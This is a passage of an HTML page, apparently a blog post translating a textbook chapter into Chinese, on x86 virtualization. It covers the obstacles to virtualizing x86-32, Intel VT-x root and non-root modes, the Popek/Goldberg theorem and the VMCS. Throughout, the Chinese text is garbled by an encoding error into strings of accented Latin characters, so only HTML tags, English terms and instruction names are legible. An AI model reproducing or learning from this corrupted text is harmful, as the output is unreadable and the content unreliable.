å¿…é¡»ä½¿ç”¨å…¶ä½™çš„ä¸‰ä¸ªç‰¹æƒçº§æ¥ç¡®ä¿éš”ç¦»ã€‚è¿™ä¼šåˆ›å»ºä¸€ä¸ªåˆ«åï¼Œå› ä¸ºè‡³å°‘æœ‰ä¸¤ä¸ªä¸åŒçš„å®¢æˆ·ç‰¹æƒçº§å¿…é¡»ä½¿ç”¨ç›¸åŒçš„å®é™…ç‰¹æƒçº§ã€‚ç„¶è€Œï¼Œæ ¹æ®æ¶æ„çš„è§„èŒƒï¼Œè¿è¡Œåœ¨è¿™ä¸¤ä¸ªç‰¹æƒçº§ä¸­çš„è½¯ä»¶å¿…é¡»ç›¸äº’ä¿æŠ¤ã€‚</li><li>åœ°å€ç©ºé—´å‹ç¼©ï¼šVMMå¿…é¡»ä½äºçº¿æ€§åœ°å€ç©ºé—´çš„æŸä¸ªéƒ¨åˆ†ï¼Œè€Œå®¢æˆ·è½¯ä»¶ä¸èƒ½è®¿é—®æˆ–ä½¿ç”¨è¯¥éƒ¨åˆ†ã€‚</li><li>å¯¹ç‰¹æƒçŠ¶æ€çš„éæ•…éšœè®¿é—®ï¼šä¸€äº›è‡­åæ˜­è‘—çš„Pentium 17 [151]æŒ‡ä»¤æä¾›å¯¹ç‰¹æƒçŠ¶æ€çš„åªè¯»è®¿é—®ï¼Œå¹¶ä¸”æ˜¯è¡Œä¸ºæ•æ„Ÿçš„ï¼Œä¾‹å¦‚ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆsidtï¼‰ï¼Œå…¨å±€æè¿°ç¬¦è¡¨ï¼ˆsgdtï¼‰ç­‰çš„çº¿æ€§å†…å­˜ä½ç½®ã€‚è¿™äº›ç»“æ„ç”±VMMæ§åˆ¶ï¼Œä½ç½®ä¸å®¢æˆ·æ“ä½œç³»ç»ŸæŒ‡å®šçš„ä½ç½®ä¸åŒã€‚</li><li>å®¢æˆ·è½¬æ¢çš„ä¸å¿…è¦å½±å“ï¼šä¸ºäº†æ»¡è¶³æ•ˆç‡æ ‡å‡†ï¼Œå…³é”®æ˜¯æ•æ„ŸæŒ‡ä»¤ï¼ˆå¿…é¡»è§¦å‘è½¬æ¢çš„æŒ‡ä»¤ï¼‰åœ¨å®é™…ä¸­å¾ˆå°‘å‡ºç°ã€‚ä¸å¹¸çš„æ˜¯ï¼Œç°ä»£æ“ä½œç³»ç»Ÿå¹¿æ³›ä¾èµ–äºç‰¹æƒçº§æ•æ„Ÿçš„æŒ‡ä»¤ï¼Œä¾‹å¦‚åœ¨å…³é”®åŒºåŸŸå†…æš‚åœä¸­æ–­ï¼Œæˆ–åœ¨å†…æ ¸å’Œç”¨æˆ·æ¨¡å¼ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™äº›æŒ‡ä»¤ä¸åº”å¯¹è™šæ‹ŸåŒ–æ•æ„Ÿã€‚</li><li>ä¸­æ–­è™šæ‹ŸåŒ–ï¼šä¸­æ–­æ ‡å¿—çš„çŠ¶æ€ï¼ˆ%eflags.ifï¼‰å¯¹éç‰¹æƒæŒ‡ä»¤ï¼ˆpushfï¼‰å¯è§ã€‚ç”±äºå½“å®¢æˆ·æ­£åœ¨è¿è¡Œæ—¶æ— æ³•æ¸…é™¤è¯¥æ ‡å¿—ï¼Œå› ä¸ºè¿™ä¼šè¿åå®‰å…¨æ€§ï¼Œå› æ­¤å®¢æˆ·ç›´æ¥ä½¿ç”¨è¯¥æŒ‡ä»¤å°†å¯¼è‡´ä¸æ­£ç¡®çš„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒpopfæŒ‡ä»¤æ˜¯æ§åˆ¶æ•æ„Ÿçš„ï¼Œå› ä¸ºå…¶è¯­ä¹‰å–å†³äºCPUæ˜¯å¦å¯ä»¥æ§åˆ¶ä¸­æ–­ï¼ˆå³%cpl â‰¤ %eflags.ioplï¼‰ã€‚</li><li>è®¿é—®éšè—çŠ¶æ€ï¼šx86-32æ¶æ„åŒ…å«ä¸€äº›â€œéšè—â€çŠ¶æ€ï¼Œæœ€åˆä»å†…å­˜åŠ è½½ï¼Œä½†å¦‚æœå†…å­˜ä¸­çš„å†…å®¹å‘ç”Ÿæ›´æ”¹ï¼Œåˆ™æ— æ³•ç”±è½¯ä»¶è®¿é—®ã€‚ä¾‹å¦‚ï¼Œ32ä½æ®µå¯„å­˜å™¨æ˜¯éšè—çš„ï¼šå®ƒä»¬ä»å†…å­˜åŠ è½½åˆ°å¤„ç†å™¨ä¸­ï¼Œä½†ä¸èƒ½ä»å¤„ç†å™¨é‡æ–°åŠ è½½åˆ°é€šç”¨å¯„å­˜å™¨æˆ–å†…å­˜ä¸­ã€‚åªè¦å†…å­˜å†…å®¹ä¸å‘ç”Ÿæ›´æ”¹ï¼Œå°±å¯ä»¥å°†æ®µå¯„å­˜å™¨é‡æ–°åŠ è½½åˆ°å¤„ç†å™¨ä¸­ï¼Œä¾‹å¦‚ï¼Œåœ¨ç”±è™šæ‹ŸåŒ–å¼•èµ·çš„é™·é˜±åå’Œå¯¹å®¢æˆ·æ“ä½œç³»ç»Ÿè¿›è¡Œéšè—åã€‚ç„¶è€Œï¼Œä¸€äº›æ—§æ“ä½œç³»ç»Ÿï¼Œå°¤å…¶æ˜¯Windows 95ï¼Œåœ¨æŸäº›å…³é”®åŒºåŸŸä¿®æ”¹æ®µæè¿°ç¬¦è¡¨çš„å†…å®¹ï¼Œä½†æ˜ç¡®ä¾èµ–äºè¿™äº›éå¸¸ç‰¹å®šçš„x86-32è¯­ä¹‰ã€‚</li></ol><p>å½“ç„¶ï¼Œç¬¬3ç« ä¸­æè¿°çš„ç³»ç»Ÿçš„è¯æ®è¡¨æ˜ï¼Œè¿™äº›æŒ‘æˆ˜åœ¨å®è·µä¸­å¯ä»¥å¾—åˆ°ç¼“è§£ï¼Œä½†æ— æ³•å®Œå…¨æ¶ˆé™¤ã€‚ä¾‹å¦‚ï¼Œåœ°å€ç©ºé—´å‹ç¼©æŒ‘æˆ˜ä¼šåœ¨è™šæ‹Ÿæœºä½¿ç”¨çº¿æ€§å†…å­˜é¡¶éƒ¨æ—¶å½±å“æ€§èƒ½ï¼šä¸€äº›å®¢æˆ·æ“ä½œç³»ç»Ÿå¯èƒ½ä¼šå› æ­¤è¡¨ç°éå¸¸å·®ã€‚æ›´ä»¤äººæ‹…å¿§çš„æ˜¯ï¼Œä¸€äº›â€œè‡­åæ˜­è‘—â€çš„â€œPentium 17â€æŒ‡ä»¤å§‹ç»ˆä¼šå‘åœ¨ç”¨æˆ·çº§åˆ«è¿è¡Œçš„åº”ç”¨ç¨‹åºè¿”å›ä¸æ­£ç¡®çš„ç»“æœï¼Œè¿™æ˜¯å¯¹ç­‰æ€§çš„é™åˆ¶ã€‚</p><p>åœ¨è®¾è®¡VT-xæ—¶ï¼Œè‹±ç‰¹å°”çš„æ ¸å¿ƒè®¾è®¡ç›®æ ‡æ˜¯å®Œå…¨æ»¡è¶³Popekå’ŒGoldbergå®šç†çš„è¦æ±‚ï¼Œæ˜ç¡®çš„ç›®æ ‡æ˜¯è¿è¡Œåœ¨åŸºäºVT-xçš„è™šæ‹ŸåŒ–ç¨‹åºä¹‹ä¸Šçš„è™šæ‹Ÿæœºæ»¡è¶³ç­‰æ•ˆæ€§ã€å®‰å…¨æ€§å’Œæ€§èƒ½è¿™ä¸‰ä¸ªæ ¸å¿ƒå±æ€§ã€‚</p><ol><li>ç­‰æ•ˆæ€§ï¼ˆEquivalenceï¼‰ï¼šè‹±ç‰¹å°”çš„æ¶æ„å¸ˆä»¬è®¾è®¡äº†VT-xï¼Œä»¥åœ¨è™šæ‹ŸåŒ–ç¡¬ä»¶å’ŒåŸºç¡€ç¡¬ä»¶ä¹‹é—´æä¾›ç»å¯¹çš„æ¶æ„å…¼å®¹æ€§ï¼Œè€Œä¸”è¿˜è¦å‘åå…¼å®¹ä¼ ç»Ÿçš„x86-32å’Œx86-64 ISAã€‚è¿™æ¯”VMware Workstationæ›´ä¸ºé›„å¿ƒå‹ƒå‹ƒï¼Œåè€…ç€çœ¼äºä¸€ç»„æ˜ç¡®å®šä¹‰çš„å®¢æˆ·æ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸”åŠè™šæ‹ŸåŒ–æ–¹æ³•å¦‚Xenï¼Œå®ƒéœ€è¦å†…æ ¸ä¿®æ”¹ï¼Œå¹¶ä¸”å®é™…ä¸Šåªé€‚ç”¨äºå¼€æºæ“ä½œç³»ç»Ÿã€‚</li><li>å®‰å…¨æ€§ï¼ˆSafetyï¼‰ï¼šåŸºäºåŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘æˆ–åŠè™šæ‹ŸåŒ–çš„å…ˆå‰è™šæ‹ŸåŒ–ç¨‹åºé€šè¿‡éœ€è¦åœ¨è½¯ä»¶ä¸­ç»´æŠ¤å¤æ‚çš„ä¸å˜é‡çš„æ¨ç†æ¥æä¾›å®‰å…¨æ€§å’Œéš”ç¦»æ€§ï¼Œä¾‹å¦‚æ­£ç¡®ä½¿ç”¨åˆ†æ®µè¿›è¡Œä¿æŠ¤ã€‚é€šè¿‡ä¸“é—¨ä¸ºè™šæ‹ŸåŒ–è®¾è®¡çš„ä½“ç³»ç»“æ„æ”¯æŒï¼Œä¸€ä¸ªå¤§å¤§ç®€åŒ–çš„è™šæ‹Ÿæœºç›‘è§†ç¨‹åºå¯ä»¥æä¾›ç›¸åŒçš„ç‰¹æ€§ï¼Œä½†ä»£ç è§„æ¨¡è¦å°å¾—å¤šã€‚è¿™å‡å°‘äº†è™šæ‹Ÿæœºç›‘è§†ç¨‹åºçš„æ½œåœ¨æ”»å‡»é¢å’Œè½¯ä»¶æ¼æ´çš„é£é™©ã€‚</li><li>æ€§èƒ½ï¼ˆPerformanceï¼‰ï¼šå…·æœ‰è®½åˆºæ„å‘³çš„æ˜¯ï¼Œæ€§èƒ½æ¯”ç°æœ‰çš„æœ€å…ˆè¿›çš„è™šæ‹ŸåŒ–æŠ€æœ¯æ›´é«˜å¹¶ä¸æ˜¯ç¬¬ä¸€ä»£ç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒçš„å‘å¸ƒç›®æ ‡ã€‚ç›¸åï¼Œåœ¨å¼€å§‹é˜¶æ®µçš„ç›®æ ‡ä»…ä»…æ˜¯å»ºç«‹é€‚å½“çš„ä½“ç³»ç»“æ„å’Œåœ¨ä½“ç³»ç»“æ„å’Œå¾®ä½“ç³»ç»“æ„çº§åˆ«è¿›è¡ŒæŒç»­æ”¹è¿›çš„è·¯çº¿å›¾ã€‚äº‹å®ä¸Šï¼Œç¬¬ä¸€ä»£å…·æœ‰ç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒçš„å¤„ç†å™¨åœ¨æ€§èƒ½ä¸Šä¸ä½¿ç”¨DBTçš„æœ€å…ˆè¿›çš„è§£å†³æ–¹æ¡ˆä¸ç«äº‰ã€‚</li></ol><h2 id="4-2-VT-X-æ¶æ„"><a href="#4-2-VT-X-æ¶æ„" class="headerlink" title="4.2 VT-X æ¶æ„"></a>4.2 VT-X æ¶æ„</h2><p>VT-xæ¶æ„çš„æ ¸å¿ƒè®¾è®¡å†³ç­–æ˜¯ä¸æ”¹å˜ISAï¼ˆæŒ‡ä»¤é›†æ¶æ„ï¼‰ä¸­å„ä¸ªæŒ‡ä»¤çš„è¯­ä¹‰ã€‚è¿™å½“ç„¶åŒ…æ‹¬é‚£äº›æœ€æ˜æ˜¾è¿åè™šæ‹ŸåŒ–åŸåˆ™çš„æŒ‡ä»¤ã€‚ä½œä¸ºä¸€ä¸ªæ¨è®ºï¼Œè¯¥æ¶æ„ä¹Ÿä¸è¯•å›¾å•ç‹¬è§£å†³é™åˆ¶è™šæ‹ŸåŒ–çš„æ¶æ„çš„å„ä¸ªæ–¹é¢ï¼Œå¦‚ç¬¬4.1èŠ‚æ‰€è¿°ã€‚ç›¸åï¼ŒVT-xå¤åˆ¶äº†å¤„ç†å™¨çš„æ•´ä¸ªæ¶æ„å¯è§çŠ¶æ€ï¼Œå¹¶å¼•å…¥äº†ä¸€ç§æ–°çš„æ‰§è¡Œæ¨¡å¼ï¼šæ ¹æ¨¡å¼ï¼ˆroot modeï¼‰ã€‚Hypervisorsï¼ˆè™šæ‹Ÿæœºç›‘è§†ç¨‹åºï¼‰å’Œä¸»æœºæ“ä½œç³»ç»Ÿåœ¨æ ¹æ¨¡å¼ä¸‹è¿è¡Œï¼Œè€Œè™šæ‹Ÿæœºåœ¨éæ ¹æ¨¡å¼ä¸‹æ‰§è¡Œã€‚è¿™ä¸ªæ¶æ„æ‰©å±•å…·æœ‰ä»¥ä¸‹å±æ€§ï¼š</p><ul><li>å¤„ç†å™¨åœ¨ä»»ä½•æ—¶é—´ç‚¹éƒ½å¤„äºæ ¹æ¨¡å¼æˆ–éæ ¹æ¨¡å¼ä¸­çš„ä¸€ç§ã€‚çŠ¶æ€è½¬æ¢æ˜¯åŸå­çš„ï¼Œæ„å‘³ç€å•ä¸ªæŒ‡ä»¤æˆ–é™·é˜±å¯ä»¥ä»ä¸€ç§æ¨¡å¼åˆ‡æ¢åˆ°å¦ä¸€ç§æ¨¡å¼ã€‚è¿™ä¸æ“ä½œç³»ç»Ÿæ‰§è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„ä¼ ç»Ÿå®ç°æ–¹å¼ä¸åŒï¼Œåè€…éœ€è¦ä¸€ä¸ªå¤æ‚çš„æŒ‡ä»¤åºåˆ—ã€‚</li><li>æ–°æ¨¡å¼ï¼ˆæ ¹æ¨¡å¼ä¸éæ ¹æ¨¡å¼ï¼‰ä»…ç”¨äºè™šæ‹ŸåŒ–ã€‚å®ƒä¸å¤„ç†å™¨çš„æ‰€æœ‰å…¶ä»–æ‰§è¡Œæ¨¡å¼ï¼ˆä¾‹å¦‚ï¼Œå®æ¨¡å¼ã€v8086æ¨¡å¼ã€ä¿æŠ¤æ¨¡å¼ï¼‰æ­£äº¤ï¼Œè¿™äº›æ¨¡å¼åœ¨ä¸¤ç§æ¨¡å¼ä¸‹éƒ½å¯ç”¨ã€‚å®ƒä¹Ÿä¸ä¿æŠ¤æ¨¡å¼çš„ä¿æŠ¤çº§åˆ«ï¼ˆä¾‹å¦‚%cpl=0â€“%cpl=3ï¼‰æ­£äº¤ï¼Œæ¯ç§æ¨¡å¼åˆ†åˆ«é€‚ç”¨äºæ¯ç§æ¨¡å¼ã€‚</li><li>æ¯ç§æ¨¡å¼å®šä¹‰äº†è‡ªå·±ç‹¬ç«‹çš„å®Œæ•´64ä½çº¿æ€§åœ°å€ç©ºé—´ã€‚æ¯ä¸ªåœ°å€ç©ºé—´ç”±ç‹¬ç«‹çš„é¡µè¡¨æ ‘å®šä¹‰ï¼Œå…·æœ‰ç‹¬ç«‹çš„é¡µè¡¨å¯„å­˜å™¨ã€‚åªæœ‰ä¸å½“å‰æ¨¡å¼å¯¹åº”çš„åœ°å€ç©ºé—´åœ¨TLBä¸­å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œå¹¶ä¸”TLBåœ¨çŠ¶æ€è½¬æ¢çš„ä¸€éƒ¨åˆ†ä¸­ä»¥åŸå­æ–¹å¼æ›´æ”¹ã€‚</li><li>æ¯ç§æ¨¡å¼éƒ½æœ‰è‡ªå·±çš„ä¸­æ–­æ ‡å¿—ã€‚ç‰¹åˆ«æ˜¯åœ¨éæ ¹æ¨¡å¼ä¸‹ï¼Œè½¯ä»¶å¯ä»¥è‡ªç”±åœ°æ“ä½œä¸­æ–­æ ‡å¿—ï¼ˆ%eflags.ifï¼‰ã€‚å¤–éƒ¨ä¸­æ–­é€šå¸¸åœ¨æ ¹æ¨¡å¼ä¸‹ä¼ é€’ï¼Œå¹¶åœ¨å¿…è¦æ—¶è§¦å‘ä»éæ ¹æ¨¡å¼åˆ°æ ¹æ¨¡å¼çš„è½¬æ¢ã€‚å³ä½¿åœ¨éæ ¹ä¸­æ–­è¢«ç¦ç”¨æ—¶ï¼ŒçŠ¶æ€è½¬æ¢ä»ä¼šå‘ç”Ÿã€‚</li></ul><p>å›¾4.1è¯´æ˜äº†VT-xçš„æ ¸å¿ƒè®¾è®¡å¦‚ä½•ç”±ç³»ç»Ÿè½¯ä»¶ä½¿ç”¨ï¼šåœ¨æ ¹æ¨¡å¼ä¸‹ï¼Œè½¯ä»¶å¯ä»¥è®¿é—®x86-64çš„å®Œæ•´ï¼ˆéè™šæ‹ŸåŒ–ï¼‰æ¶æ„ï¼ŒåŒ…æ‹¬å—ä¿æŠ¤æ¨¡å¼çš„æ‰€æœ‰ç‰¹æƒç¯ï¼ˆåœ¨å›¾ä¸­æ˜¾ç¤ºï¼‰ä»¥åŠæ‰§è¡Œçš„ä¼ ç»Ÿæ¨¡å¼ï¼ˆæœªæ˜¾ç¤ºï¼‰ã€‚è¿™æä¾›äº†æ¶æ„çš„å‘åå…¼å®¹æ€§ï¼Œå› æ­¤å¯¹äºè½¯ä»¶æ¥è¯´ï¼Œä¸»æœºæ“ä½œç³»ç»Ÿé€šå¸¸åœ¨æ ¹-%cpl=0ä¸­è¿è¡Œï¼Œå…¶åº”ç”¨ç¨‹åºå°†åœ¨æ ¹-%cpl=3ä¸­è¿è¡Œã€‚è™šæ‹Ÿæœºç›‘è§†ç¨‹åºä¹Ÿåœ¨æ ¹-%cpl=0ä¸­è¿è¡Œï¼Œåœ¨é‚£é‡Œå®ƒå¯ä»¥å‘å‡ºæ–°çš„ç‰¹æƒæŒ‡ä»¤ä»¥è¿›å…¥éæ ¹æ¨¡å¼ã€‚å›¾4.1è¿˜æ˜¾ç¤ºï¼Œè™šæ‹Ÿæœºä½¿ç”¨ç‰¹æƒç¯çš„å®Œæ•´å‰¯æœ¬æ‰§è¡Œï¼šæ¯ä¸ªå®¢æˆ·æ“ä½œç³»ç»Ÿåœ¨éæ ¹-%cpl=0ä¸­è¿è¡Œï¼Œåº”ç”¨ç¨‹åºåœ¨éæ ¹-%cpl=3ä¸­è¿è¡Œã€‚</p><p><img src="https://img.gls.show/img/20230904155559.png"></p><h3 id="4-2-1-VT-X-å’Œ-POPEK-GOLDBERG-å®šç†"><a href="#4-2-1-VT-X-å’Œ-POPEK-GOLDBERG-å®šç†" class="headerlink" title="4.2.1 VT-X å’Œ POPEK/GOLDBERG å®šç†"></a>4.2.1 VT-X å’Œ POPEK/GOLDBERG å®šç†</h3><p>å›æƒ³ä¸€ä¸‹2.2ä¸­è®¨è®ºçš„ Popek å’Œ Goldberg çš„ä¸­å¿ƒè™šæ‹ŸåŒ–å®šç†ã€‚</p><blockquote><p>..å®šç†1[143] : å¯¹äºä»»ä½•ä¼ ç»Ÿçš„ç¬¬ä¸‰ä»£è®¡ç®—æœºï¼Œå¦‚æœè¯¥è®¡ç®—æœºçš„æ•æ„ŸæŒ‡ä»¤é›†æ˜¯ç‰¹æƒæŒ‡ä»¤é›†çš„å­é›†ï¼Œåˆ™å¯ä»¥æ„é€ è™šæ‹Ÿæœºç›‘è§†å™¨ã€‚</p></blockquote><p>VT-xæ¶æ„æ»¡è¶³äº†Popekå’ŒGoldbergçš„å®šç†çš„æ ‡å‡†ï¼Œä½†é€šè¿‡ä¸æœ€åˆç”¨äºè¯æ˜è¯¥å®šç†çš„åŸå§‹æ¨¡å‹ç›¸æ¯”ï¼Œè¿›è¡Œäº†é‡å¤§çš„æ”¹è¿›ã€‚Popekå’ŒGoldbergç¡®å®šäº†è™šæ‹ŸåŒ–çš„å…³é”®æ ‡å‡†ã€‚é€šè¿‡ä»–ä»¬çš„å®šç†æ„å»ºè¯æ˜ï¼Œä»–ä»¬è¿›ä¸€æ­¥è¯æ˜äº†è™šæ‹ŸåŒ–å¯ä»¥åœ¨ä¸éœ€è¦ä»»ä½•é¢å¤–çš„ç¡¬ä»¶çº¦æŸçš„æƒ…å†µä¸‹å®ç°ï¼Œåªéœ€æ”¯æŒå—ä¿æŠ¤æ“ä½œç³»ç»Ÿæ‰€éœ€çš„é‚£äº›çº¦æŸï¼Œç‰¹åˆ«æ˜¯ä½¿ç”¨åœ°å€ç©ºé—´å‹ç¼©å’Œç¯åˆ«åï¼ˆåœ¨ç”¨æˆ·çº§åˆ«åŒæ—¶è¿è¡Œå®¢æˆ·æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºï¼‰æ¥æ„å»ºè™šæ‹Ÿæœºç›‘è§†ç¨‹åºã€‚</p><p>è€Œè‹±ç‰¹å°”é‡‡å–äº†ä¸€ç§ä¸åŒçš„å®ç”¨è·¯å¾„ï¼Œé€šè¿‡å¤åˆ¶å¤„ç†å™¨çš„æ•´ä¸ªçŠ¶æ€å¹¶å¼•å…¥ä¸“ç”¨çš„æ ¹æ¨¡å¼ã€‚ç‰¹åˆ«æ˜¯ï¼Œå¯¹æ¶æ„çš„å®Œå…¨å¤åˆ¶æ˜¯ä¸ºäº†ç¡®ä¿ISAçš„å‘åå…¼å®¹æ€§å’Œè™šæ‹ŸåŒ–å·¥ä½œè´Ÿè½½çš„å®Œå…¨ç­‰æ•ˆæ€§è€Œè¿›è¡Œçš„[171]ã€‚å› æ­¤ï¼Œå¿…é¡»é‡æ–°å®šä¹‰æœ¯è¯­ï¼Œä»¥ç¡®å‡¿åœ°è¡¨è¾¾VT-xéµå¾ªPopek/Goldbergæ ‡å‡†ã€‚ç›¸åº”çš„æ ¸å¿ƒVT-xè®¾è®¡åŸåˆ™å¯ä»¥éæ­£å¼åœ°è¡¨è¿°å¦‚ä¸‹ã€‚</p><blockquote><p>åœ¨å…·æœ‰æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼æ‰§è¡Œä»¥åŠå¤„ç†å™¨çŠ¶æ€çš„å®Œå…¨å‰¯æœ¬çš„ä½“ç³»ç»“æ„ä¸­ï¼Œå¦‚æœæ‰€æœ‰æ•æ„ŸæŒ‡ä»¤ï¼ˆæ ¹æ®éå¯è™šæ‹ŸåŒ–çš„ä¼ ç»Ÿä½“ç³»ç»“æ„ï¼‰éƒ½å…·æœ‰æ ¹æ¨¡å¼ç‰¹æƒï¼Œåˆ™å¯ä»¥æ„å»ºè™šæ‹Ÿæœºç›‘è§†ç¨‹åºã€‚<br>åœ¨éæ ¹æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶ï¼Œæ‰€æœ‰å…·æœ‰æ ¹æ¨¡å¼ç‰¹æƒçš„æŒ‡ä»¤éƒ½æ˜¯ï¼ˆiï¼‰ç”±å¤„ç†å™¨å®ç°çš„ï¼Œè¦æ±‚å®ƒä»¬ä»…å¯¹å¤„ç†å™¨çš„éæ ¹å‰¯æœ¬æ‰§è¡Œæ“ä½œï¼Œæˆ–è€…ï¼ˆiiï¼‰å¼•å‘é™·é˜±ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥åšä¸‰ä¸ªè§‚å¯Ÿã€‚</p><ol><li>ä¸æœ€åˆçš„Popekå’ŒGoldbergå®šç†ä¸åŒï¼Œè¿™ä¸ªé‡æ–°è¡¨è¿°ä¸è€ƒè™‘æŒ‡ä»¤æ˜¯å¦å…·æœ‰ç‰¹æƒï¼ˆæ ¹æ®å®ƒä»¬å¯¹åœ¨%cpl&gt;0è¿è¡Œçš„è½¯ä»¶çš„å¯ç”¨æ€§å®šä¹‰ï¼‰ï¼Œè€Œåªè€ƒè™‘å®ƒä»¬æ˜¯å¦å…·æœ‰æ ¹æ¨¡å¼ç‰¹æƒçš„é—®é¢˜ã€‚</li><li>è¿™äº›é™·é˜±è¶³ä»¥æ»¡è¶³ç­‰æ•ˆæ€§å’Œå®‰å…¨æ€§çš„æ ‡å‡†ã€‚è¿™ä¸æœ€åˆçš„å®šç†ç±»ä¼¼ã€‚</li><li>ä½†æ˜¯ï¼Œé€šè¿‡åœ¨ç¡¬ä»¶ä¸­å®ç°æŸäº›æ•æ„ŸæŒ‡ä»¤ä»¥å‡å°‘è½¬æ¢æ˜¯æ»¡è¶³è™šæ‹ŸåŒ–çš„æ€§èƒ½æ ‡å‡†æ‰€å¿…éœ€çš„ã€‚</li></ol><p>ä¸¾å‡ ä¸ªä¾‹å­å¯ä»¥å¸®åŠ©è¯´æ˜çµæ•åº¦çš„æ¦‚å¿µä¸ï¼ˆå¸¸è§„çš„ï¼‰ç‰¹æƒçš„æ¦‚å¿µæ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚é¦–å…ˆï¼Œä»¥éæ ¹-%cpl=0è¿è¡Œçš„å®¢æˆ·æ“ä½œç³»ç»Ÿå°†å‘å‡ºæŸäº›ç‰¹æƒæŒ‡ä»¤ï¼Œä¾‹å¦‚è¯»å–æˆ–ç”šè‡³å†™å…¥æ§åˆ¶å¯„å­˜å™¨ï¼šè¿™äº›æŒ‡ä»¤å¿…é¡»åœ¨å¤„ç†å™¨çŠ¶æ€çš„éæ ¹å‰¯æœ¬ä¸Šè¿è¡Œã€‚æ ¹æ®åŸåˆ™ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æœ‰ä¸¤ç§å¯èƒ½çš„å®ç°æ–¹å¼ï¼šï¼ˆiï¼‰è¦ä¹ˆåœ¨ç¡¬ä»¶ä¸­åœ¨éæ ¹ä¸Šä¸‹æ–‡ä¸­æ‰§è¡ŒæŒ‡ä»¤ï¼Œå› ä¸ºæ•´ä¸ªå¤„ç†å™¨çŠ¶æ€éƒ½æ˜¯å¤åˆ¶çš„ã€‚è™šæ‹Ÿæœºç›‘è§†ç¨‹åºä¸åº”è¢«é€šçŸ¥ï¼Œå› ä¸ºç¡¬ä»¶å®Œå…¨å¤„ç†è¿™äº›æŒ‡ä»¤ï¼›ï¼ˆiiï¼‰æˆ–è€…ä»éæ ¹æ¨¡å¼å¼•å‘é™·é˜±ï¼Œå…è®¸è™šæ‹Ÿæœºç›‘è§†ç¨‹åºæ¨¡æ‹ŸæŒ‡ä»¤ã€‚ä»æ€§èƒ½çš„è§’åº¦æ¥çœ‹ï¼Œå‰è€…æ›´å¯å–ï¼Œå› ä¸ºå®ƒå‡å°‘äº†è½¬æ¢çš„æ¬¡æ•°ã€‚æ˜¾ç„¶ï¼Œè¿™éœ€è¦å¤„ç†å™¨çš„ç‰¹å®šæ¶æ„æ”¯æŒã€‚å› æ­¤ï¼Œå®æ–½å†³ç­–æ˜¯ç¡¬ä»¶å¤æ‚æ€§å’Œæ€»ä½“æ€§èƒ½ä¹‹é—´çš„æƒè¡¡ã€‚</p><p>ä½œä¸ºç¬¬äºŒä¸ªä¾‹å­ï¼Œæ“çºµä¸­æ–­æ ‡å¿—çš„æŒ‡ä»¤ï¼ˆcliã€stiã€popfï¼‰æ˜¯æ•æ„Ÿçš„ï¼Œç‰¹åˆ«æ˜¯å› ä¸ºå…¶ä»–æŒ‡ä»¤å®é™…ä¸Šå¯ä»¥å°†å…³äºä¸­æ–­æ ‡å¿—æœ¬èº«çš„ä¿¡æ¯æ³„æ¼åˆ°å†…å­˜ä¸­ï¼ˆpushfï¼‰ã€‚ç„¶è€Œï¼Œè¯·è®°ä½ï¼Œè¿™å››ä¸ªæŒ‡ä»¤åœ¨ä½“ç³»ç»“æ„ä¸­ä¸æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ƒä»¬å¯¹ç”¨æˆ·çº§åº”ç”¨ç¨‹åºæ˜¯å¯ç”¨çš„ã€‚é‰´äºå®ƒä»¬åœ¨ç°ä»£å†…æ ¸ä¸­çš„é«˜æ‰§è¡Œç‡ï¼Œå®ƒä»¬çš„éæ ¹å®ç°æ˜¯ç”±å¤„ç†å™¨ç›´æ¥å¤„ç†çš„ã€‚</p><p>ä½œä¸ºç¬¬ä¸‰ä¸ªä¾‹å­ï¼Œä¸€äº›åœ¨ç”¨æˆ·çº§å¯ç”¨çš„æŒ‡ä»¤ï¼Œå¦‚sgdtå’Œsidtï¼Œæ˜¯å·²çŸ¥çš„è¡Œä¸ºæ•æ„ŸæŒ‡ä»¤ã€‚è¿™äº›ç½•è§çš„æŒ‡ä»¤è™½ç„¶ä¸å…·å¤‡ç‰¹æƒï¼Œä½†å¯¹è™šæ‹ŸåŒ–æ•æ„Ÿã€‚å› æ­¤ï¼Œå®ƒä»¬å¿…é¡»å…·æœ‰ï¼ˆå¹¶ä¸”ç¡®å®å¦‚æ­¤ï¼‰æ ¹æ¨¡å¼ç‰¹æƒã€‚</p><h3 id="4-2-2æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´çš„è½¬æ¢"><a href="#4-2-2æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="4.2.2æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´çš„è½¬æ¢"></a>4.2.2æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´çš„è½¬æ¢</h3><p><img src="https://img.gls.show/img/20230904161040.png"></p><p>å›¾4.2å±•ç¤ºäº†VT-xå®ç°ä¸­æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´çš„ä¸»è¦äº¤äº’å’Œè½¬æ¢ã€‚è™šæ‹Ÿæœºçš„çŠ¶æ€å­˜å‚¨åœ¨ç‰©ç†å†…å­˜ä¸­çš„ä¸€ä¸ªä¸“ç”¨ç»“æ„ä¸­ï¼Œç§°ä¸ºè™šæ‹Ÿæœºæ§åˆ¶ç»“æ„ï¼ˆVirtual Machine Control Structureï¼ŒVMCSï¼‰ã€‚ä¸€æ—¦åˆå§‹åŒ–ï¼Œè™šæ‹Ÿæœºé€šè¿‡vm 